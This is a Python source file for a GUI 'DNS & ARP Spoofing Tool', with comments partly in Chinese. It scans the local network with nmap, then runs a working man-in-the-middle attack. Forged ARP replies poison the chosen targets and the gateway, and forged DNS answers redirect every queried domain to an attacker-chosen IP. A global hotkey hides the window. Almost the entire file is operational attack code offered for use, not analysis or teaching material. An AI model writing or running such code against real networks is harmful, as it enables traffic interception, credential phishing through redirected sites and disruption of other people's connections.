import sys
import socket
import nmap
from scapy.all import get_if_hwaddr, conf, send, sendp, DNS, IP, UDP, DNSRR, Ether, ARP, sniff, AsyncSniffer, get_if_list, get_if_addr, srp
from PyQt5 import QtWidgets, QtCore
from PyQt5.QtWidgets import QVBoxLayout, QListWidget, QPushButton, QLineEdit, QWidget, QMenu, QComboBox
from datetime import datetime
import threading
import time
import subprocess
import keyboard

redirect_ip = ""
attacking = False
scanning = False

def get_gateway_ip():
    """Get gateway IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        return s.getsockname()[0]
    finally:
        s.close()
        
def get_gateway_ip_from_arp(iface):
    """获取指定接口的网关 IP 地址。用的windows 'route print' 命令。"""
    try:
        iface_ip = get_if_addr(iface)  # 获取接口的 IP 地址
        # 使用 'route print' 命令来获取路由表
        result = subprocess.run(['route', 'print'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = result.stdout.decode('latin-1')  # 使用 latin-1 编码
        # 解析路由表，寻找指定 IP 地址的默认网关
        gateway = None
        for line in output.split('\n'):
            if '0.0.0.0' in line and iface_ip in line:
                parts = line.split()
                # 检查是否有 'gateway' 字段并获取其后面的地址
                if len(parts) > 2:  # 确保有足够的部分
                    gateway = parts[2]  # 直接获取网关地址
                    break
        return gateway
    except Exception as e:
        print(f"获取网关时出错: {e}")
        return None

def get_mac_address(ip_address, iface):
    """使用 ARP 获取给定 IP 地址的 MAC 地址。"""
    arp_request = ARP(pdst=ip_address)
    ether = Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff')
    packet = ether / arp_request
    answered_list = srp(packet, iface=iface, timeout=2, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def scan_network(network):
    """Scan the network for live IPs using nmap."""
    return_list = []
    nm = nmap.PortScanner()
    nm.scan(hosts=network, arguments="-T4 -n -Pn")
    for host in nm.all_hosts():
        if nm[host]["status"]["state"] == "up" and "mac" in nm[host]["addresses"]:
            try:
                mac_address = nm[host]["addresses"]["mac"]
                manufacturer = "Unknown"
                return_list.append([nm[host]["addresses"]["ipv4"], f"{mac_address} ({manufacturer})"])
            except KeyError:
                pass
    return return_list

def dns_spoof(pkt):
    """Handle DNS spoofing."""
    global redirect_ip
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  
        queried_domain = pkt[DNS].qd.qname.decode("utf-8")  
        source_ip = pkt[IP].src  
        destination_ip = pkt[IP].dst  
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{current_time}] Captured DNS query: {queried_domain} from {source_ip}, redirecting to {redirect_ip}")

        response = IP(src=destination_ip, dst=source_ip) / \
                   UDP(sport=53, dport=pkt[UDP].sport) / \
                   DNS(id=pkt[DNS].id, qr=1, qd=pkt[DNS].qd,
                       an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=redirect_ip, ttl=10))
        print(f"[{current_time}] Forged DNS response: {queried_domain} -> {redirect_ip}")
        send(response, verbose=0)  

def arp_attack(target_ips, my_mac, gateway_ip, gateway_mac, iface):
    """Perform ARP spoofing."""
    global attacking
    while attacking:
        for target_ip in target_ips:
            packet_to_target = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, psrc=gateway_ip, hwsrc=my_mac, pdst=target_ip)
            sendp(packet_to_target, verbose=0, iface=iface)
            packet_to_gateway = Ether(src=my_mac, dst=gateway_mac) / ARP(
                op=2, psrc=target_ip, hwsrc=my_mac, pdst=gateway_ip)
            sendp(packet_to_gateway, verbose=0, iface=iface)
            time.sleep(2)  # Adjust this to your needs

class App(QWidget):
    scanning = True

    def __init__(self):
        super().__init__()
        self.redirect_ip = get_gateway_ip()
        self.interface = None
        self.initUI()
        self.target_ips = []
        self.sniff_thread = None  # Initialize as None
        keyboard.add_hotkey('ctrl+p', self.toggle_visibility)

    def initUI(self):
        self.setWindowTitle('DNS & ARP Spoofing Tool')
        self.layout = QVBoxLayout()

        self.interface_select = QComboBox(self)
        self.populate_interfaces()
        self.layout.addWidget(self.interface_select)

        self.redirect_ip_input = QLineEdit(self)
        self.redirect_ip_input.setPlaceholderText("Enter redirect IP")
        self.redirect_ip_input.setText(self.redirect_ip)
        self.layout.addWidget(self.redirect_ip_input)

        self.target_ip_list = QListWidget()
        self.target_ip_list.setSelectionMode(QListWidget.MultiSelection)
        self.layout.addWidget(self.target_ip_list)

        self.manual_ip_input = QLineEdit(self)
        self.manual_ip_input.setPlaceholderText("Manually enter target IP")
        self.manual_ip_input.setFixedHeight(30)
        self.layout.addWidget(self.manual_ip_input)

        self.scan_button = QPushButton('Scan Network')
        self.scan_button.clicked.connect(self.scan_network)
        self.layout.addWidget(self.scan_button)

        self.start_button = QPushButton('Start Attack')
        self.start_button.clicked.connect(self.start_attack)
        self.layout.addWidget(self.start_button)

        self.setLayout(self.layout)

        self.target_ip_list.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
        self.target_ip_list.customContextMenuRequested.connect(self.open_context_menu)

        self.target_ip_list.itemDoubleClicked.connect(self.on_item_double_clicked)

    def toggle_visibility(self):
        """Toggle the visibility of the window."""
        if self.isVisible():
            self.hide()  # Hide the window
        else:
            self.show()  # Show the window
            
    def populate_interfaces(self):
        """Populate the interface dropdown with available network interfaces."""
        interfaces = get_if_list()
        gateway_ip = get_gateway_ip()  # 获取本机的网关 IP
        for iface in interfaces:
            try:
                mac = get_if_hwaddr(iface)
                ip = get_if_addr(iface)
                if ip != "0.0.0.0":
                    item_text = f"{iface} (MAC: {mac}, IP: {ip})"
                    self.interface_select.addItem(item_text)
                    # 优先选择与网关 IP 一致的接口
                    if ip == gateway_ip:
                        self.interface_select.setCurrentText(item_text)  # 设置为当前选择
            except Exception as e:
                print(f"Could not retrieve info for {iface}: {e}")


    def on_item_double_clicked(self, item):
        """Handle double-click signal to add IP to manual input."""
        ip_address = item.text().split(' - ')[0]
        self.add_ip_to_manual_input(ip_address)

    def add_ip_to_manual_input(self, ip_address):
        """Add selected IP address to manual input."""
        manual_input_text = self.manual_ip_input.text().strip()
        existing_ips = set(manual_input_text.split(', ')) if manual_input_text else set()
        existing_ips.add(ip_address)  # Automatically avoid duplicates
        self.manual_ip_input.setText(', '.join(existing_ips))

    def open_context_menu(self, position):
        menu = QMenu()
        move_to_manual_ip_action = menu.addAction("Move to Manual IP Input")
        action = menu.exec_(self.target_ip_list.viewport().mapToGlobal(position))
        if action == move_to_manual_ip_action:
            self.move_selected_to_manual_ip_input()

    def move_selected_to_manual_ip_input(self):
        """Move selected IP to manual input and avoid duplicates."""
        selected_items = self.target_ip_list.selectedItems()
        ip_addresses = [item.text().split(' - ')[0] for item in selected_items]
        if ip_addresses:
            # Avoid duplicates
            manual_input_text = self.manual_ip_input.text().strip()
            existing_ips = set(manual_input_text.split(', ')) if manual_input_text else set()
            existing_ips.update(ip_addresses)  # Add new IP while avoiding duplicates
            self.manual_ip_input.setText(', '.join(existing_ips))

    def scan_network(self):
        """Initiate a network scan."""
        global scanning
        if not scanning:
            print("Scanning network, please wait...")
            scanning = True
            self.scan_button.setText("Stop Scan Network")
            self.scan_thread = threading.Thread(target=self.perform_network_scan)
            self.scan_thread.start()
        else:
            print("Stopping network scan...")
            scanning = False
            if self.scan_thread.is_alive():
                self.scan_thread.join(timeout=1)
            self.scan_button.setText("Scan Network")

    def perform_network_scan(self):
        """Perform the actual scanning and update the UI."""
        global scanning
        gateway_ip = get_gateway_ip()
        network = f"{gateway_ip.rsplit('.', 1)[0]}.0/24"
        self.target_ip_list.clear()
        result_found = False

        while scanning:
            result = scan_network(network)
            if result and not result_found:
                print("Scan successful!")
                for ip_info in result:
                    self.target_ip_list.addItem(f"{ip_info[0]} - {ip_info[1]}")
                result_found = True
                break
            time.sleep(1)

        print("Network scan stopped.")
        self.scan_button.setText("Scan Network")

    def start_attack(self):
        global attacking  #
        manual_ips = self.manual_ip_input.text().split(',')
        manual_ips = [ip.strip() for ip in manual_ips if ip.strip()]

        selected_ips = [item.text().split(' - ')[0] for item in self.target_ip_list.selectedItems()]

        self.target_ips = set(selected_ips + manual_ips) 

        if not self.target_ips: 
            print("没有提供任何目标 IP。空目标只会对主机造成影响")
            QtWidgets.QMessageBox.warning(self, "警告", "空目标只作用于主机")
        
        if not attacking: 
            print("Goal IP:", ", ".join(self.target_ips))
            selected_iface_text = self.interface_select.currentText()
            iface = selected_iface_text.split(' (')[0]  # 仅获取接口名称
            gateway_ip = get_gateway_ip_from_arp(iface)
            if gateway_ip is None:
                print("无法获取网关 IP，请检查网络连接或接口设置。")
                QtWidgets.QMessageBox.warning(self, "警告", "无法获取网关 IP，请检查网络连接或接口设置。")
                return 
            else:
                print("Gateway address：", gateway_ip)
            attacking = True
            self.start_button.setText("Stop Arp Attack")
            global redirect_ip
            redirect_ip = self.redirect_ip_input.text()  # 从输入框获取重定向 IP

            self.start_sniffing()

            self.attack_thread = threading.Thread(target=self.perform_attack)
            self.attack_thread.start()  # 启动攻击线程
            print("Arp Attack...")
        else:  
            print("Stop Arp Attack...")
            attacking = False
            self.start_button.setText("Start Attack")
            self.stop_sniffing()  # 停止嗅探
            if hasattr(self, 'arp_thread') and self.arp_thread.is_alive():
                self.arp_thread.join(timeout=1)  # 等待 ARP 线程结束

    def perform_attack(self):
        """Perform the actual attack logic in a separate thread."""
        global attacking  
        selected_iface_text = self.interface_select.currentText()
        iface = selected_iface_text.split(' (')[0]  # 仅获取接口名称
        my_mac = get_if_hwaddr(iface)  # 获取自己的 MAC 地址，基于选定的接口

        # 取网关 IP
        gateway_ip = get_gateway_ip_from_arp(iface)
        if gateway_ip is None:
            print(f"获取网关 {gateway_ip} 的 MAC 地址失败。")
            attacking = False
            self.start_button.setText("Start Attack")
            return

        gateway_mac = get_mac_address(gateway_ip, iface)  # 获取网关的 MAC 地址
        if gateway_mac is None:
            print(f"获取网关 {gateway_ip} 的 MAC 地址失败。")
            attacking = False
            self.start_button.setText("Start Attack")
            return

        self.arp_thread = threading.Thread(target=arp_attack, args=(list(self.target_ips), my_mac, gateway_ip, gateway_mac, iface))
        self.arp_thread.start()  # 启动攻击线程

    def start_sniffing(self):
        """Start sniffing for DNS queries in a separate thread."""
        self.sniffer = AsyncSniffer(filter="udp port 53", prn=dns_spoof, store=0)
        self.sniffer.start()
        print("Listening for DNS queries...")

    def stop_sniffing(self):
        """Stop the sniffing process."""
        if hasattr(self, 'sniffer') and self.sniffer and self.sniffer.running:
            try:
                self.sniffer.stop()
                print("Stopped sniffing for DNS queries.")
            except Exception as e:
                print(f"停止嗅探时出错: {e}")
        else:
            print("嗅探器未运行或未初始化。")

if __name__ == '__main__':
    app = QtWidgets.QApplication(sys.argv)
    ex = App()
    ex.show()
    sys.exit(app.exec_())
